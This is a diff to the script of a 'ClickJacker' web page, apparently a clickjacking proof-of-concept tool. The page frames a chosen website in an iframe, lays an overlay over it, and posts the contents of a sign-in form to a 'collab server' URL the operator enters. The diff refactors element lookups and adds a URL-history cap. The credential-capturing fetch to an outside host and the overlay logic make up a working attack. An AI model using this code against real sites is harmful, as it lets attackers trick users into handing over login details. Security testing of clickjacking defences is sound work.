@@ -7,7 +7,8 @@
 	<title>ClickJacker</title>
 
 	<script type="text/javascript">
-		var overlayActive = false;
+		var elIframe, elWebInput, elCollabInput, elHistory;
+		var HISTORY_LIMIT = 20;
 
 		function setFrameStatus(state) {
 			var badge = document.getElementById("frame-status");
@@ -16,10 +17,9 @@
 		}
 
 		function attachFrameListener() {
-			var iframe = document.getElementsByName("website")[0];
-			iframe.addEventListener("load", function() {
+			elIframe.addEventListener("load", function() {
 				try {
-					var href = iframe.contentWindow.location.href;
+					var href = elIframe.contentWindow.location.href;
 					// Readable href means either a same-origin page or a browser
 					// error/blocked page. Any about: URL (including Firefox's
 					// about:neterror) and Chrome's chrome-error: scheme both
@@ -41,20 +41,23 @@
 		}
 
 		function loadWebsite() {
-			var url = document.getElementsByName("webInput")[0].value.trim();
+			var url = elWebInput.value.trim();
 			if (!url) return;
-			var iframe = document.getElementsByName("website")[0];
 			setFrameStatus("loading");
-			iframe.src = url;
+			elIframe.src = url;
 			addToHistory(url);
 		}
 
 		function addToHistory(url) {
-			var list = document.getElementById("url-history");
-			var items = list.querySelectorAll("li");
+			var items = elHistory.querySelectorAll("li");
 			for (var i = 0; i < items.length; i++) {
 				if (items[i].dataset.url === url) return;
 			}
+			// Enforce history cap
+			if (items.length >= HISTORY_LIMIT) {
+				elHistory.removeChild(elHistory.lastElementChild);
+			}
+
 			var li = document.createElement("li");
 			li.dataset.url = url;
 			li.title = url;
@@ -68,20 +71,19 @@
 			btn.textContent = "Load";
 			btn.onclick = (function(u) {
 				return function() {
-					document.getElementsByName("webInput")[0].value = u;
+					elWebInput.value = u;
 					setFrameStatus("loading");
-					document.getElementsByName("website")[0].src = u;
+					elIframe.src = u;
 				};
 			})(url);
 
 			li.appendChild(label);
 			li.appendChild(btn);
-			list.prepend(li);
+			elHistory.prepend(li);
 		}
 
 		function clickjackOverlay() {
-			if (overlayActive) return;
-			overlayActive = true;
+			if (document.getElementById("overlay")) return;
 
 			var link = document.createElement("link");
 			link.setAttribute("rel", "stylesheet");
@@ -107,7 +109,6 @@
 		function removeOverlay() {
 			var overlay = document.getElementById("overlay");
 			if (overlay) overlay.parentNode.removeChild(overlay);
-			overlayActive = false;
 			var resetBtn = document.getElementById("overlay-reset");
 			if (resetBtn) resetBtn.style.display = "none";
 		}
@@ -116,8 +117,7 @@
 			var signinForm = document.querySelector("#signin_form");
 			var formData = new FormData(signinForm);
 			try {
-				var collabServer = document.getElementsByName("collabInput")[0].value;
-				var response = await fetch(collabServer, {
+				var response = await fetch(elCollabInput.value, {
 					method: "POST",
 					body: formData,
 				});
@@ -128,14 +128,18 @@
 		}
 
 		document.addEventListener("DOMContentLoaded", function() {
+			elIframe      = document.getElementsByName("website")[0];
+			elWebInput    = document.getElementsByName("webInput")[0];
+			elCollabInput = document.getElementsByName("collabInput")[0];
+			elHistory     = document.getElementById("url-history");
+
 			attachFrameListener();
 
-			var initialSrc = document.getElementsByName("website")[0].src;
-			if (initialSrc && initialSrc !== "about:blank" && initialSrc !== window.location.href) {
-				addToHistory(initialSrc);
+			if (elIframe.src && elIframe.src !== "about:blank" && elIframe.src !== window.location.href) {
+				addToHistory(elIframe.src);
 			}
 
-			document.getElementsByName("webInput")[0].addEventListener("keydown", function(e) {
+			elWebInput.addEventListener("keydown", function(e) {
 				if (e.key === "Enter") loadWebsite();
 			});
 		});
